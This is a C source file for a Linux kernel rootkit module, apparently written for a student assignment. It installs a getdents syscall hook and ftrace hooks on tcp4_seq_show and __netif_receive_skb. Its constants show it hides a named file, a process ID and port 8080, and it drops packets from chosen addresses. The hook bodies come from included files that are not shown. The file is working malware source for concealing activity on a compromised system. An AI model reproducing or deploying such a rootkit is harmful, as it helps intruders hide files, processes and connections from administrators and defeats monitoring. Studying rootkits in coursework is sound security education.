#define MODULE
#define LINUX
#define __KERNEL__

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/uaccess.h>
#include <linux/unistd.h>
#include <linux/slab.h>
#include <linux/compiler.h>
#include <linux/types.h>
#include <linux/proc_fs.h>
#include <linux/ftrace.h>
#include <linux/socket.h>
#include <net/sock.h>
#include <linux/trace.h>
#include <linux/seq_file.h>
#include <linux/fdtable.h>
#include <linux/limits.h>
#include <linux/ip.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/in.h>
#include <linux/inet.h>

#include "ftrace_utils.h"
#include "syshook_utils.h"

#define HIDDEN_PORT 8080
#define HIDDEN_FILE_DIR "/home/student/projects/hw"
#define HIDDEN_FILE_NAME "myfile"
#define PROC_PATH "/proc"
#define HIDDEN_PID "108190"
#define DROP_SIP "8.8.8.8"
#define DROP_ARP_SIP "10.0.0.117"
#define DROP_SPORT 5999

#include "hook_functions/tcp_seq_show.c"
#include "hook_functions/getdents.c"
#include "hook_functions/netif_receive_skb.c"

typedef enum {
    FAILED_TO_SET_SYSTEM_HOOKS = INT_MIN,
    FAILED_TO_SET_TCP_FHOOK_HOOK,
    FAILED_TO_SET_NETIF_FHOOK_HOOK,
    FAILED_TO_SET_MSHOW_FHOOK_HOOK,
    SUCCESSFULLY_INSTALLED = 0,
} ErrorCode;


static struct ftrace_hook netif_fhook = {
    .hook_func = hook_netif,
    .orig_func_pointer = (void**)&org_netif,
};

static struct ftrace_hook tcp_seq_show_fhook = {
    .hook_func = hook_tcp4_seq_show,
    .orig_func_pointer = (void**)&org_tcp4_seq_show,
};

static struct sys_hook sys_hooks[] = {
    {
        .orig_func_pointer = (void**)&original_getdents,
        .hook_func = sys_getdents_hook,
        .sys_entry = __NR_getdents,
    },
};

int init_module(void)
{
    int res = 0;
    ErrorCode errorCode = SUCCESSFULLY_INSTALLED;

    res = set_sys_hooks(sys_hooks, ARRAY_SIZE(sys_hooks));
    if (res != 0){
        printk("failed to set system hooks");
        errorCode = FAILED_TO_SET_SYSTEM_HOOKS;
        goto cleanup_return;
    }

    res = set_ftrace_hook("tcp4_seq_show", &tcp_seq_show_fhook);
    if (res != 0){
        printk("failed to set tcp hook");
        errorCode = FAILED_TO_SET_TCP_FHOOK_HOOK;
        goto undo_sys_hooks;
    }

    res = set_ftrace_hook("__netif_receive_skb", &netif_fhook);
    if (res != 0){
        printk("failed to set netif hook");
        errorCode = FAILED_TO_SET_NETIF_FHOOK_HOOK;
        goto undo_tcp_show_hook;
    }
    goto cleanup_return;

undo_netif_hook:
    undo_ftrace_hook(&netif_fhook);
undo_tcp_show_hook:
    undo_ftrace_hook(&tcp_seq_show_fhook);
undo_sys_hooks:
    undo_sys_hooks(sys_hooks, ARRAY_SIZE(sys_hooks));
cleanup_return:
    return errorCode;
}

void cleanup_module(void) 
{
    undo_sys_hooks(sys_hooks, ARRAY_SIZE(sys_hooks));
    undo_ftrace_hook(&tcp_seq_show_fhook);
    undo_ftrace_hook(&netif_fhook);
}

MODULE_LICENSE("GPL");

